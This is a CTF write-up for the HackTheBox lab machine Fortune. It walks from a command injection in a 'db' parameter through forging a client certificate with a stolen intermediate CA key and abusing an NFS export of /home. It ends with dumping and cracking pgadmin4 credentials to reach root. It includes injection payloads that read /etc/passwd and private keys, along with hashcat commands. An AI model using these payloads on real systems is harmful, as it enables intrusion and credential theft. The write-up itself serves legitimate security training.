---
categories:
- CTF
layout: post
media_subpath: /assets/posts/2019-08-03-fortune-hackthebox
tags:
- certificates
- hackthebox
- nfs
- openbsd
- postgresql
title: Fortune @ HackTheBox
---

Fortune is a 50 point machine on [hackthebox.eu](https://www.hackthebox.eu) featuring OpenBSD. I was lucky enough to get first blood on this box thanks to my team at the time [p0l1T3am](https://www.hackthebox.eu/home/teams/profile/1121) and especially [ykataky](https://www.hackthebox.eu/home/users/profile/49189). Techniques required in Fortune are the creation and signing of public keys, using client certificates, nfs-shares and postgresql/pgadmin4.

## User Flag

The initial nmap scan shows the following results:

```
22/tcp  open  ssh        OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey:
|   2048 07:ca:21:f4:e0:d2:c6:9e:a8:f7:61:df:d7:ef:b1:f4 (RSA)
|   256 30:4b:25:47:17:84:af:60:e2:80:20:9d:fd:86:88:46 (ECDSA)
|_  256 93:56:4a:ee:87:9d:f6:5b:f9:d9:25:a6:d8:e0:08:7e (ED25519)
80/tcp  open  http       OpenBSD httpd
|_http-server-header: OpenBSD httpd
|_http-title: Fortune
443/tcp open  ssl/https?
|_ssl-date: TLS randomness does not represent time
```

Checking the web ports we see that port 443 requires a client certificate so only port 80 is left for now. We are presented with this website:

![](htb_fortune_p80.png)Following the request in burp it can be seen that there exists just one parameter "db":

```
POST /select HTTP/1.1
Host: fortune.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://fortune.htb/
Content-Type: application/x-www-form-urlencoded
Content-Length: 8
Connection: close
Upgrade-Insecure-Requests: 1

db=zippy
```

Originally I expected some sort of LFI here so we start by fuzzing the parameter with wfuzz:

```
wfuzz --hh 293 -w ~/tools/SecLists/Fuzzing/LFI-JHADDIX.txt -d "db=FUZZ" http://fortune.htb/select
```

```
000007:  C=200     90 L       191 W     4277 Ch    "%0a/bin/cat%20/etc/passwd"
```

Just a after a few seconds we see that it found a way to inject commands, in this case reading "/etc/passwd". Since typing the commands in burp is not too inconvenient we start by enumerating the system. First thing is to recursively list the home folders to see if there is an easy user flag grab, but fortunately this is not the case here (looking at you netmon). However we learn about some local users and find some certificate files:

```
drwxr-xr-x   5 root     wheel     512B Nov  2 21:19 .
drwxr-xr-x  13 root     wheel     512B Mar  9 14:14 ..
drwxr-xr-x   5 bob      bob       512B Nov  3 16:29 bob
drwxr-x---   3 charlie  charlie   512B Nov  5 22:02 charlie
drwxr-xr-x   2 nfsuser  nfsuser   512B Nov  2 22:39 nfsuser
...
/home/bob/ca/intermediate/certs:
total 32
drwxr-xr-x  2 bob  bob   512B Nov  3 15:40 .
drwxr-xr-x  7 bob  bob   512B Nov  3 15:37 ..
-r--r--r--  1 bob  bob   4.0K Oct 29 20:58 ca-chain.cert.pem
-r--r--r--  1 bob  bob   1.9K Oct 29 21:13 fortune.htb.cert.pem
-r--r--r--  1 bob  bob   2.0K Oct 29 20:56 intermediate.cert.pem

/home/bob/ca/intermediate/private:
total 20
drwxr-xr-x  2 bob  bob   512B Oct 29 21:13 .
drwxr-xr-x  7 bob  bob   512B Nov  3 15:37 ..
-r--------  1 bob  bob   1.6K Oct 29 21:10 fortune.htb.key.pem
-rw-r--r--  1 bob  bob   3.2K Oct 29 20:48 intermediate.key.pem
...
```

It looks like we have everything we need here to create our own key and sign it with the ca certs! We download the pem files of the intermediate ca because we see both the key and the cert for it, by using `cat`:

```
db=%0a/bin/cat%20/home/bob/ca/intermediate/private/intermediate.key.pem
db=%0a/bin/cat%20/home/bob/ca/intermediate/certs/intermediate.cert.pem
```

Looking at the intermediate ca certificate we see the following contents:

![](htb_fortune_intermediate_ca.png)We start by creating a new key and csr for "alice":

```
openssl req -newkey rsa:4096 -keyout alice_key.pem -out alice_csr.pem -nodes -days 365 -subj "/CN=alice"
```

Then we sign the key with the certificate and private key of the intermediate ca:

```
openssl x509 -req -in alice_csr.pem -CA intermediate.cert.pem -CAkey intermediate.key.pem -out alice_cert.pem -set_serial 01 -days 365
```

Now that we have a valid certificate we can try to use it on port 443 (remember it required a client certificate). It would be intuitive to just import the cert in firefox or chrome, but unfortunately they can only import certificate and key together when they are in pkcs12 format. So we convert and import them in firefox:

```
openssl pkcs12 -export -clcerts -in alice_cert.pem -inkey alice_key.pem -out alice.p12
```

![](htb_fortune_certificate_manager.png)When going to website on port 443 now we are now given the option to generate a ssh private key and add it to authorized hosts:

![](htb_fortune_authpf.png)We copy the key to a file, change the permissions to 600 and try to ssh into the box with the username we found earlier, eventually succeeding by using "nfsuser":

```
➜  fortune ssh -i priv.key  nfsuser@fortune.htb

Hello nfsuser. You are authenticated from host "10.10.14.14"
```

We do however not get a login shell. The reason for this is that we have authenticated to [authpf](https://www.openbsd.org/faq/pf/authpf.html). Authpf will make changes to its ruleset after authenticating that allows traffic to pass through the filter. So at this point we should scan the box again to see what ports are open:

```
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
443/tcp  open  https
629/tcp  open  3com-amp3
2049/tcp open  nfs
8081/tcp open  blackice-icecap
```

We see that port 2049 is open and we have a user called nfsuser which strongly hints that we can probably mount something on the filesystem using nfs. Using the RCE from the beginning we read "/etc/exports" and get just one entry:

```
/home
```

This means we can mount /home with:

```
sudo mount 10.10.10.127:/home ./mount
```

At this point we can read the user.txt file from charlies home folder:

![](htb_fortune_userflag.png)The reason this worked so quickly is that charlie has uid 1000 on the box, the same uid as my user on my machine. NFS matches permissions based on the uid/gid on the server and the connected client. If my user didn’t have uid 1000 but instead 1001 the mounting would still have worked but as user bob.  
Enumerating the folders inside home we notice that we can write to the "authorized\_keys" file of charlie and decide to add our own public ssh key (generate with `ssh-keygen -f alice_key.pem -y > alice.pub`) to it, so we can finally ssh into the box:

![](htb_fortune_ssh.png)## Root Flag

Looking around as charlie we find a mbox file inside his home folder with the following content:

```
Hi Charlie,

Thanks for setting-up pgadmin4 for me. Seems to work great so far.
BTW: I set the dba password to the same as root. I hope you don't mind.

Cheers,

Bob
```

So we search the filesystem for pgadmin4, find it under "/var/appsrv/pgadmin4" and notice that we have read access to the database file "pgadmin4.db"! We open the file in `sqlite3` and dump the contents:

```
sqlite3 pgadmin4.db
.dump
...
INSERT INTO user VALUES(1,'charlie@fortune.htb','$pbkdf2-sha512$25000$3hvjXAshJKQUYgxhbA0BYA$iuBYZKTTtTO.cwSvMwPAYlhXRZw8aAn9gBtyNQW3Vge23gNUMe95KqiAyf37.v1lmCunWVkmfr93Wi6.W.UzaQ',1,NULL);
INSERT INTO user VALUES(2,'bob@fortune.htb','$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg',1,NULL);
...
INSERT INTO server VALUES(1,2,2,'fortune','localhost',5432,'postgres','dba',X'75745555306a6b616d435a446d71464c4f724175506a46784c307a70387a577a495365354d463047592f6c3853696c726d753363617172746a61566a4c516c76464645674553477a',NULL,'prefer',NULL,NULL,'','',NULL,'<STORAGE_DIR>/.postgresql/postgresql.crt','<STORAGE_DIR>/.postgresql/postgresql.key',NULL,NULL,0,NULL,NULL,NULL,0,NULL,'22',NULL,0,NULL,0,NULL)
COMMIT;
.exit
```

We got 3 means of authentication here "dba", "charlie@fortune.htb" and "bob@fortune.htb". In the background I immediately start to try crack the hashes of bob and charlie, but ultimately didn’t have too much success with it. Just a quick note on cracking: John seems to detect these in the wrong format "HMAC-SHA256" while they are actually "pbkdf2-sha512" hashes. To start the cracking process I used `hashcat64.exe -m 12100 hashes.txt` with the following adjusted hash file:

hashes.txt:

```
sha512:25000:z9nbm1Oq9Z5TytkbQ8h5Dw:Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg3
sha512:25000:3hvjXAshJKQUYgxhbA0BYA:iuBYZKTTtTO.cwSvMwPAYlhXRZw8aAn9gBtyNQW3Vge23gNUMe95KqiAyf37.v1lmCunWVkmfr93Wi6.W.UzaQ
```

In the end it didn’t give any results though. Enumerating the box a lot I did not find anything else that helped me so I went back to the dba password. This doesn’t look like a hash and after some research it turns out that it is actually an encrypted form of the dba password. We can learn that by looking at "/usr/local/pgadmin4/pgadmin4-3.4/web/pgadmin/utils/driver/psycopg2/connection.py", where it has the lines:

```
if encpass:
  # Fetch Logged in User Details.
  user = User.query.filter_by(id=current_user.id).first()

  if user is None:
      return False, gettext("Unauthorized request.")

  try:
      password = decrypt(encpass, user.password)
      # Handling of non ascii password (Python2)
      if hasattr(str, 'decode'):
          password = password.decode('utf-8').encode('utf-8')
      # password is in bytes, for python3 we need it in string
      elif isinstance(password, bytes):
          password = password.decode()

  except Exception as e:
      manager.stop_ssh_tunnel()
      current_app.logger.exception(e)
      return False, \
          _(
              "Failed to decrypt the saved password.\nError: {0}"
          ).format(str(e))
```

I made a [script](https://gist.github.com/xct/cc72a9bd0775bfebb112538a662e2be2) based on pgadmin4s own "crypto.py" to decrypt the dba password. The ciphertext is the actual dba password and the key is the *hash* of bobs password. This is a bit weird since I assumed I would need the password of bob and not its hash but `¯\_(ツ)_/¯`.

This results in a password which we can use to su to root and read the root flag!

![](htb_fortune_rootflag.png)I don’t think the box should have 50 points attached it but I enjoyed it a lot – many thanks to the creator [AuxSarge](https://twitter.com/jtestart)